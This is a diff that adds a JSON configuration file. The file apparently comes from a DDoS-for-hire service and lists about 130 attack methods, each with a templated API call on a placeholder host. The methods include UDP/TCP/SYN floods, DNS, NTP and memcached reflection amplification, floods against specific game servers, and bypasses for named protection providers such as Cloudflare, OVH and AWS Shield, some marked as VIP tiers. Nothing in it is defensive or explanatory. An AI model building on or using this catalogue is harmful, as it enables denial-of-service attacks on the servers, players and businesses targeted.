@@ -1,0 +1,926 @@
+{
+  "udp": {
+    "description": "High volume UDP flood with header bypass",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=udp"
+    ]
+  },
+  "tcp": {
+    "description": "TCP Handshake bypass flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tcp"
+    ]
+  },
+  "syn": {
+    "description": "TCP SYN connection flood (connection exhaust)",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=syn"
+    ]
+  },
+  "ovh": {
+    "description": "UDP flood specialized for OVH game bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ovh"
+    ]
+  },
+  "ack": {
+    "description": "TCP ACK packets flood to saturate connection queues",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ack"
+    ]
+  },
+  "dns": {
+    "description": "DNS reflection and amplification attack",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=dns"
+    ]
+  },
+  "home": {
+    "description": "Home connections flooder (UDP/TCP raw)",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=home"
+    ]
+  },
+  "discord": {
+    "description": "Discord webhook connection spammer and flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=discord"
+    ]
+  },
+  "vse": {
+    "description": "Valve Source Engine query flooder",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=vse"
+    ]
+  },
+  "fortnite": {
+    "description": "Fortnite game server connection flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=fortnite"
+    ]
+  },
+  "pubg": {
+    "description": "PUBG game connection flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=pubg"
+    ]
+  },
+  "fivem": {
+    "description": "GTA V FiveM server connection bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=fivem"
+    ]
+  },
+  "http": {
+    "description": "HTTP Layer 7 requests flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http"
+    ]
+  },
+  "http-raw": {
+    "description": "HTTP GET raw requests flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-raw"
+    ]
+  },
+  "tls": {
+    "description": "TLS Layer 7 connection bypass flooder",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls"
+    ]
+  },
+  "https-bypass": {
+    "description": "HTTPS bypass flood for Cloudflare/DDoS guards",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=https-bypass"
+    ]
+  },
+  "http-beta": {
+    "description": "HTTP Layer 7 beta bypass flooder",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-beta"
+    ]
+  },
+  "udp-v2": {
+    "description": "High capacity UDP flood v2 with customized packet load",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=udp-v2"
+    ]
+  },
+  "udp-pps": {
+    "description": "High PPS UDP flood to exhaust packet processing queues",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=udp-pps"
+    ]
+  },
+  "udp-raw": {
+    "description": "Raw socket UDP packet stream bypass",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=udp-raw"
+    ]
+  },
+  "udp-mix": {
+    "description": "Mixed packet size UDP flood (random size headers)",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=udp-mix"
+    ]
+  },
+  "udp-opt": {
+    "description": "Optimized UDP stream bypassing firewall limits",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=udp-opt"
+    ]
+  },
+  "tcp-socket": {
+    "description": "TCP Raw sockets connection flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tcp-socket"
+    ]
+  },
+  "tcp-bypass": {
+    "description": "TCP connection handshake firewall bypass",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tcp-bypass"
+    ]
+  },
+  "tcp-reset": {
+    "description": "TCP connection reset flood using spoofed RST packets",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tcp-reset"
+    ]
+  },
+  "syn-flood": {
+    "description": "High volume TCP SYN connection flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=syn-flood"
+    ]
+  },
+  "syn-ack": {
+    "description": "TCP SYN-ACK reflection handshake flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=syn-ack"
+    ]
+  },
+  "dns-amplification": {
+    "description": "DNS resolver reflection and amplification bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=dns-amplification"
+    ]
+  },
+  "dns-reflection": {
+    "description": "DNS amplification via open resolvers reflection",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=dns-reflection"
+    ]
+  },
+  "ntp-amplification": {
+    "description": "NTP monlist reflection amplification flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ntp-amplification"
+    ]
+  },
+  "ssdp-amplification": {
+    "description": "SSDP reflection amplification flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ssdp-amplification"
+    ]
+  },
+  "memcached-flood": {
+    "description": "Memcached amplification attack bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=memcached-flood"
+    ]
+  },
+  "snmp-flood": {
+    "description": "SNMP reflection amplification flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=snmp-flood"
+    ]
+  },
+  "ldap-flood": {
+    "description": "CLDAP reflection amplification flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ldap-flood"
+    ]
+  },
+  "ardp-flood": {
+    "description": "Apple Remote Desktop Protocol reflection amplification",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ardp-flood"
+    ]
+  },
+  "sentinel-flood": {
+    "description": "Sentinel reflection amplification flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=sentinel-flood"
+    ]
+  },
+  "valve-query": {
+    "description": "Steam/Valve server queries packet generator",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=valve-query"
+    ]
+  },
+  "mc-query": {
+    "description": "Minecraft server ping and query flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=mc-query"
+    ]
+  },
+  "ts3-query": {
+    "description": "TeamSpeak 3 server query flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ts3-query"
+    ]
+  },
+  "samp-query": {
+    "description": "San Andreas Multiplayer server query flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=samp-query"
+    ]
+  },
+  "rust-query": {
+    "description": "Rust game server queries flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=rust-query"
+    ]
+  },
+  "fivem-bypass": {
+    "description": "GTA V FiveM query and heartbeat connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=fivem-bypass"
+    ]
+  },
+  "fivem-pps": {
+    "description": "FiveM high packet rate connection flooder",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=fivem-pps"
+    ]
+  },
+  "ark-query": {
+    "description": "ARK Survival Evolved server queries flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ark-query"
+    ]
+  },
+  "arma3-query": {
+    "description": "Arma 3 game server query flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=arma3-query"
+    ]
+  },
+  "cod-query": {
+    "description": "Call of Duty game server queries flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=cod-query"
+    ]
+  },
+  "gmod-query": {
+    "description": "Garry's Mod game server query flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=gmod-query"
+    ]
+  },
+  "csgo-query": {
+    "description": "CS:GO server connection query flooder",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=csgo-query"
+    ]
+  },
+  "minecraft-flood": {
+    "description": "Minecraft server protocol handshake flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=minecraft-flood"
+    ]
+  },
+  "minecraft-bypass": {
+    "description": "Minecraft server connection bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=minecraft-bypass"
+    ]
+  },
+  "pubg-bypass": {
+    "description": "PUBG server connection packet bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=pubg-bypass"
+    ]
+  },
+  "fortnite-bypass": {
+    "description": "Fortnite connection server packet bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=fortnite-bypass"
+    ]
+  },
+  "discord-spam-v2": {
+    "description": "Discord webhook spammer and API connection flood v2",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=discord-spam-v2"
+    ]
+  },
+  "discord-webhook-pps": {
+    "description": "Discord API webhook high rate connection spammer",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=discord-webhook-pps"
+    ]
+  },
+  "teamspeak-flood": {
+    "description": "TeamSpeak voice protocol connection flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=teamspeak-flood"
+    ]
+  },
+  "mumble-flood": {
+    "description": "Mumble voice server protocol connection flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=mumble-flood"
+    ]
+  },
+  "wireguard-flood": {
+    "description": "WireGuard UDP connection handshake flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=wireguard-flood"
+    ]
+  },
+  "ovh-pps": {
+    "description": "OVH game firewall high PPS bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ovh-pps"
+    ]
+  },
+  "ovh-hex": {
+    "description": "OVH game firewall custom hexadecimal payload flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ovh-hex"
+    ]
+  },
+  "ovh-game": {
+    "description": "OVH specialized game protocol flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ovh-game"
+    ]
+  },
+  "nfo-bypass": {
+    "description": "NFO servers protection connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=nfo-bypass"
+    ]
+  },
+  "nfo-pps": {
+    "description": "NFO servers protection high PPS flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=nfo-pps"
+    ]
+  },
+  "path-bypass": {
+    "description": "Path.net protection connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=path-bypass"
+    ]
+  },
+  "path-pps": {
+    "description": "Path.net protection high PPS flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=path-pps"
+    ]
+  },
+  "hetzner-bypass": {
+    "description": "Hetzner protection connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=hetzner-bypass"
+    ]
+  },
+  "hetzner-pps": {
+    "description": "Hetzner protection high PPS flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=hetzner-pps"
+    ]
+  },
+  "digitalocean-bypass": {
+    "description": "DigitalOcean cloud firewall connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=digitalocean-bypass"
+    ]
+  },
+  "aws-bypass": {
+    "description": "AWS Shield connection bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=aws-bypass"
+    ]
+  },
+  "aws-pps": {
+    "description": "AWS Shield high PPS packet flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=aws-pps"
+    ]
+  },
+  "google-cloud-bypass": {
+    "description": "Google Cloud Armor protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=google-cloud-bypass"
+    ]
+  },
+  "azure-bypass": {
+    "description": "Azure DDoS Protection connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=azure-bypass"
+    ]
+  },
+  "ovh-v2": {
+    "description": "OVH protection connection bypass v2",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ovh-v2"
+    ]
+  },
+  "ovh-tcp": {
+    "description": "OVH firewall TCP connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ovh-tcp"
+    ]
+  },
+  "ovh-udp": {
+    "description": "OVH firewall UDP connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=ovh-udp"
+    ]
+  },
+  "tcp-kill": {
+    "description": "TCP connection termination stream",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tcp-kill"
+    ]
+  },
+  "udp-kill": {
+    "description": "UDP connection termination stream",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=udp-kill"
+    ]
+  },
+  "http-get": {
+    "description": "HTTP GET request method flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-get"
+    ]
+  },
+  "http-post": {
+    "description": "HTTP POST request method flood with custom body",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-post"
+    ]
+  },
+  "http-head": {
+    "description": "HTTP HEAD request method flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-head"
+    ]
+  },
+  "http-bypass-v2": {
+    "description": "HTTP connection bypass v2 for advanced CDNs",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-bypass-v2"
+    ]
+  },
+  "http-bypass-v3": {
+    "description": "HTTP connection bypass v3 for advanced CDNs",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-bypass-v3"
+    ]
+  },
+  "http-cf": {
+    "description": "HTTP Cloudflare protection connection flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-cf"
+    ]
+  },
+  "http-cf-bypass": {
+    "description": "HTTP Cloudflare connection bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-cf-bypass"
+    ]
+  },
+  "http-cloudflare": {
+    "description": "HTTP Cloudflare specialized protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-cloudflare"
+    ]
+  },
+  "http-ddos-guard": {
+    "description": "HTTP DDoS-Guard protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-ddos-guard"
+    ]
+  },
+  "http-stormwall": {
+    "description": "HTTP StormWall protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-stormwall"
+    ]
+  },
+  "http-blazingfast": {
+    "description": "HTTP BlazingFast protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-blazingfast"
+    ]
+  },
+  "http-sucuri": {
+    "description": "HTTP Sucuri protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-sucuri"
+    ]
+  },
+  "http-imperva": {
+    "description": "HTTP Imperva protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-imperva"
+    ]
+  },
+  "http-fastly": {
+    "description": "HTTP Fastly protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-fastly"
+    ]
+  },
+  "http-akamai": {
+    "description": "HTTP Akamai protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-akamai"
+    ]
+  },
+  "http-keycdn": {
+    "description": "HTTP KeyCDN protection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-keycdn"
+    ]
+  },
+  "http-max": {
+    "description": "HTTP maximum rate connection flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-max"
+    ]
+  },
+  "http-flood": {
+    "description": "HTTP generic connection flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-flood"
+    ]
+  },
+  "http-socket": {
+    "description": "HTTP socket connection flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-socket"
+    ]
+  },
+  "http-keepalive": {
+    "description": "HTTP Keep-Alive socket connection flood",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-keepalive"
+    ]
+  },
+  "http-null": {
+    "description": "HTTP connection flood with empty headers",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-null"
+    ]
+  },
+  "http-cookie": {
+    "description": "HTTP connection flood with cookie values bypass",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-cookie"
+    ]
+  },
+  "http-referer": {
+    "description": "HTTP connection flood with randomized referer",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-referer"
+    ]
+  },
+  "http-useragent": {
+    "description": "HTTP connection flood with randomized User-Agent",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-useragent"
+    ]
+  },
+  "http-random": {
+    "description": "HTTP connection flood with randomized parameters",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-random"
+    ]
+  },
+  "http-mix": {
+    "description": "HTTP connection flood with mixed methods",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-mix"
+    ]
+  },
+  "http-pps": {
+    "description": "HTTP high request per second (RPS) flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-pps"
+    ]
+  },
+  "http-pps-bypass": {
+    "description": "HTTP high RPS firewall bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-pps-bypass"
+    ]
+  },
+  "http-slowloris": {
+    "description": "HTTP Slowloris slow headers connection exhaustion",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-slowloris"
+    ]
+  },
+  "http-slowpost": {
+    "description": "HTTP Slow POST slow body connection exhaustion",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-slowpost"
+    ]
+  },
+  "http-slowread": {
+    "description": "HTTP Slow Read response reading connection exhaustion",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-slowread"
+    ]
+  },
+  "http-rudy": {
+    "description": "HTTP RU-Dead-Yet slow body connection exhaustion",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-rudy"
+    ]
+  },
+  "http-socks": {
+    "description": "HTTP proxy connection flood using SOCKS4/5 proxies",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-socks"
+    ]
+  },
+  "http-proxy": {
+    "description": "HTTP proxy connection flood using HTTP proxies",
+    "vip": false,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-proxy"
+    ]
+  },
+  "http-tls-v1.3": {
+    "description": "HTTP TLS v1.3 connection handshake flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-tls-v1.3"
+    ]
+  },
+  "http-tls-bypass": {
+    "description": "HTTP TLS connection fingerprint bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-tls-bypass"
+    ]
+  },
+  "http-tls-bypass-v2": {
+    "description": "HTTP TLS connection fingerprint bypass v2",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-tls-bypass-v2"
+    ]
+  },
+  "http-h2": {
+    "description": "HTTP/2 connection frame flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-h2"
+    ]
+  },
+  "http-http2": {
+    "description": "HTTP/2 connection multiplexing flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-http2"
+    ]
+  },
+  "http-http3": {
+    "description": "HTTP/3 over QUIC connection flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-http3"
+    ]
+  },
+  "http-quic": {
+    "description": "HTTP over QUIC stream connection flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-quic"
+    ]
+  },
+  "http-quic-bypass": {
+    "description": "HTTP over QUIC connection bypass",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-quic-bypass"
+    ]
+  },
+  "http-beta-v2": {
+    "description": "HTTP Layer 7 beta bypass flooder v2",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-beta-v2"
+    ]
+  },
+  "http-beta-v3": {
+    "description": "HTTP Layer 7 beta bypass flooder v3",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-beta-v3"
+    ]
+  },
+  "http-experimental": {
+    "description": "HTTP Layer 7 experimental bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-experimental"
+    ]
+  },
+  "http-custom": {
+    "description": "HTTP Layer 7 custom structure bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-custom"
+    ]
+  },
+  "http-raw-v2": {
+    "description": "HTTP GET raw requests flood v2",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-raw-v2"
+    ]
+  },
+  "http-raw-pps": {
+    "description": "HTTP GET raw requests high RPS flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=http-raw-pps"
+    ]
+  },
+  "tls-bypass-v2": {
+    "description": "TLS Layer 7 connection bypass flooder v2",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls-bypass-v2"
+    ]
+  },
+  "tls-bypass-v3": {
+    "description": "TLS Layer 7 connection bypass flooder v3",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls-bypass-v3"
+    ]
+  },
+  "tls-fingerprint": {
+    "description": "TLS JA3 fingerprint spoofing flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls-fingerprint"
+    ]
+  },
+  "tls-ja3": {
+    "description": "TLS JA3 handshake connection flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls-ja3"
+    ]
+  },
+  "tls-ja3-bypass": {
+    "description": "TLS JA3 handshake bypass flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls-ja3-bypass"
+    ]
+  },
+  "tls-handshake": {
+    "description": "TLS raw handshake connection flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls-handshake"
+    ]
+  },
+  "tls-session": {
+    "description": "TLS session connection exhaustion",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls-session"
+    ]
+  },
+  "tls-resume": {
+    "description": "TLS session resumption handshake flood",
+    "vip": true,
+    "urls": [
+      "http://api.example.com/attack?host=<host>&port=<port>&time=<time>&method=tls-resume"
+    ]
+  }
+}
